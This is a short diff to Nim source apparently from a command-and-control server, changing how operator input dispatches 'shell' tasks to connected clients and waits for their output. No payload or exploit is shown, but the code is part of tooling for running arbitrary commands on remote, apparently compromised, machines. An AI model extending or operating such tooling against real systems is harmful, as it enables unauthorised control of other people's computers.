@@ -39,7 +39,8 @@ proc procStdin*(server: C2Server) {.async.} =
         else:
           for client in server.cli.handlingClient:
             let task = await client.sendClientTask("shell", %*[ args.join(" ") ])
-            await task.awaitResponse()
+            if not task.isNil(): 
+              server.cli.waitingForOutput = true
       else:
         for command in c2cli.commands:
           if command.name == cmd or cmd in command.aliases:
